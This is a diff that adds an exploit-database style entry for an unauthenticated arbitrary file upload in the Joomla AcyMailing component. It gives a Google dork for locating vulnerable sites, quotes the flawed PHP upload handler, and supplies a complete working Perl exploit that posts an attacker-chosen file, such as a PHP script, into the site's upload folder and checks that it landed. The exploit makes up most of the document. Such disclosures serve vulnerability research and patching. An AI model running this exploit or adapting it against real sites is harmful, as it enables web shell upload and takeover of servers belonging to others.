@@ -1,0 +1,191 @@
+# Exploit Title: Joomla! ACYMAILING 3.9.0 component - Unauthenticated Arbitrary File Upload
+# Google Dork: inurl:"index.php?option=com_acym"
+# Date: 2020-03-16
+# Exploit Author: qw3rTyTy
+# Vendor Homepage: https://www.acyba.com/
+# Software Link: https://www.acyba.com/acymailing/download.html
+# Version: v6.9.1 Starter
+# Tested on: Joomla! v3.9.0
+# CVE: N/A
+
+
+########################################################################################
+#Analysis of vulnerability
+########################################################################################
+Vulnerable code is in MailsController::setNewIconShare() in file "back/controllers/mails.php".
+
+[BEGIN_CODE]
+   600	    public function setNewIconShare()
+   601	    {
+   602	        $socialName = acym_getVar('string', 'social', '');
+   603	        $extension = pathinfo($_FILES['file']['name']);
+   604	        $newPath = ACYM_UPLOAD_FOLDER.'socials'.DS.$socialName;
+   605	        $newPathComplete = $newPath.'.'.$extension['extension'];
+   606			//There code is no checking CSRF token, no sanitizing, and authentication.
+   607	        if (!acym_uploadFile($_FILES['file']['tmp_name'], ACYM_ROOT.$newPathComplete) || empty($socialName)) { //!!!
+   608	            echo 'error';
+   609	            exit;
+   610	        }
+   611	
+   612	        $newConfig = new stdClass();
+   613	        $newConfig->social_icons = json_decode($this->config->get('social_icons', '{}'), true);
+   614	
+   615	        $newImg = acym_rootURI().$newPathComplete;
+   616	        $newImgWithoutExtension = acym_rootURI().$newPath;
+   617	
+   618	        $newConfig->social_icons[$socialName] = $newImg;
+   619	        $newConfig->social_icons = json_encode($newConfig->social_icons);
+   620	        $this->config->save($newConfig);
+   621	
+   622	        echo json_encode(
+   623	            [
+   624	                'url' => $newImgWithoutExtension,
+   625	                'extension' => $extension['extension'],
+   626	            ]
+   627	        );
+   628	        exit;
+   629	    }
+
+function acym_uploadFile($src, $dest)
+{
+    $dest = acym_cleanPath($dest);
+
+    $baseDir = dirname($dest);
+    if (!file_exists($baseDir)) {
+        acym_createFolder($baseDir);
+    }
+
+    if (is_writeable($baseDir) && move_uploaded_file($src, $dest)) {//!!!
+        if (@chmod($dest, octdec('0644'))) {
+            return true;
+        } else {
+            acym_enqueueMessage(acym_translation('ACYM_FILE_REJECTED_SAFETY_REASON'), 'error');
+        }
+    } else {
+        acym_enqueueMessage(acym_translation_sprintf('ACYM_COULD_NOT_UPLOAD_FILE_PERMISSION', $baseDir), 'error');
+    }
+
+    return false;
+}
+[END_CODE]
+
+########################################################################################
+#Exploit
+########################################################################################
+#!/usr/bin/perl
+#
+#$> perl ./exploit.pl "http://127.0.0.1/joomla" "lolz" /tmp/lolz.php
+use strict;
+use warnings;
+use LWP::UserAgent;
+use JSON(qw/decode_json/);
+########################################################################################
+sub print_usage_and_exit
+{
+	print("*** com_acym Arbitrary File Upload exploit\n");
+	print("Usage: $0 <URL> <path_to_upload> <file_to_upload>\n");
+	print("\n");
+	
+	exit();
+}
+
+sub fetch_useragent
+{
+	my @available_useragents = (
+		"gertrud barkhorn",
+		"erica hartmann",
+		"eila ilmatar juutilainen",
+	);
+
+	return($available_useragents[(rand(scalar(@available_useragents)))]);
+}
+
+sub is_valid_url
+{
+	my $given_url = shift(@_);
+
+	return 1 if ( $given_url =~ /^http(s)?:\/\// );
+	return 0;
+}
+
+sub do_die
+{
+	my $errmsg = shift(@_);
+
+	printf("[!] %s\n", $errmsg);
+	exit();
+}
+
+sub get_base_path
+{
+	return(sprintf("%s/index.php", $_[0]));
+}
+
+sub do_exploit
+{
+	my %params = %{ shift(@_); };
+	my $ua = LWP::UserAgent->new(
+		"agent"			=>			$params{"useragent"},
+		"timeout"		=>			360
+	);
+
+	print("[+] Trying to exploit ...\n");
+	print("[*] Sending POST request ...\n");
+	my $response = $ua->post(
+		get_base_path($params{"url"}),
+		"Content-Type"	=>			"form-data",
+		"Accept-Language"		=>	"zh-cn",
+		"Content"		=>			{
+			"option"	=>			"com_acym",
+			"ctrl"		=>			"frontmails",
+			"task"		=>			"setNewIconShare",
+			"social"	=>			$params{"path"},
+			"file"		=>			[ $params{"file"} ],
+		},
+	);
+
+	if ( $response->code == 200 )
+	{
+		my $j = decode_json($response->decoded_content);
+		my $f = sprintf("%s.%s",
+			$j->{"url"}, $j->{"extension"});
+		my $response = $ua->head($f);
+
+		printf("[\$] Uploaded file in %s\n", $f) if ( $response->code == 200 );
+	}
+}
+
+sub main
+{
+	print_usage_and_exit() if ( scalar(@ARGV) < 2 );
+
+	my %params = (
+		"url" 		=>		$ARGV[0],
+		"path"		=>		$ARGV[1],
+		"file"		=>		$ARGV[2],
+		"useragent"	=>		fetch_useragent());
+
+	do_die("Given invalid URL.") if ( !is_valid_url($ARGV[0]) );
+	do_die("Given invalid File.") if ( (!-e $ARGV[2]) or (stat($ARGV[2]))[7] == 0);
+	printf("[*] Parameters:\n");
+
+	while ( my ($k, $v) = each(%params) ) { printf("[+] %s => %s\n", $k, $v); }
+	printf("*" x50 . "\n");
+
+	while ( 1 )
+	{
+		printf("[?] Proceed(y/n)> ");
+
+		my $c = <STDIN>;
+		chomp($c);
+
+		if ( (length($c) == 1) and lc($c) eq "y" )
+		{
+			do_exploit(\%params);
+			last;
+		}
+	}
+}
+
+main();
+########################################################################################
